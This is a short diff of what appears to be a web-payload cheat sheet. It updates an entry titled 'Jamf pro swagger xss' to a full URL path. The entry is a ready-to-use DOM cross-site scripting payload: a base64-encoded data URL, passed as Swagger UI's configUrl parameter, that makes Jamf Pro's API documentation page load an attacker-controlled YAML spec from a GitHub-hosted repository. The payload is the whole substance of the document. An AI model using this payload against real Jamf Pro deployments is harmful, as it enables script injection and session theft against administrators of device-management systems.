@@ -9,9 +9,8 @@
 ```
 
 
-
 # Jamf pro swagger xss
 
 ```
-?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bob2VuaXgxMTEyL3N3YWdnZXItZG9teHNzL21haW4vdGVzdC55YW1sIgp9Cg==
+/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bob2VuaXgxMTEyL3N3YWdnZXItZG9teHNzL21haW4vdGVzdC55YW1sIgp9Cg==
 ```
